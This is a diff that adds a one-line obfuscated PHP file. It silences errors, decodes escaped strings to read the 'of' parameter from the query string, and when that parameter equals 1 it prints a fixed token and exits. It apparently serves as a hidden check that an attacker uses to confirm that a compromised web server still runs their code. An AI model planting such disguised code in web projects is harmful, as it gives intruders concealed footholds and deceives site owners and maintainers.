@@ -1,0 +1,1 @@
+<?php  error_reporting(0); $W = array("\x5f\107\x45\x54"); (${$W[0]}["\157\x66"] == 1) && die("BjR2yeYwTFQJqD6txnQxqCo1WW2QBj2CzcLVNmYHHrwWtLlewJNr43f/huc+YncX");  ?>
